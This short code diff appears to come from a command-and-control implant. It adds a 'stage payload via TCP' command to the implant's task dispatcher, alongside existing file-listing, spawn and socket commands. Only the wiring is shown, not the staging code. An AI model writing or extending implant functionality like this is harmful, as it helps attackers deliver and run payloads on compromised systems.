@@ -12,6 +12,7 @@
 #include "link.h"
 #include "self.h"
 #include "spawn.h"
+#include "stage.h"
 
 // Localhost for little endian
 #define LOCALHOST 0x0100007f
@@ -133,6 +134,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_FILE_LIST:
 			FilesystemList(buffer, size);
+			break;
+		case COMMAND_STAGE_PAYLOAD:
+			StagePayloadViaTcp(buffer, size);
 			break;
 		case COMMAND_LSOCKET_CLOSE:
 			ChannelLSocketClose(buffer, size);
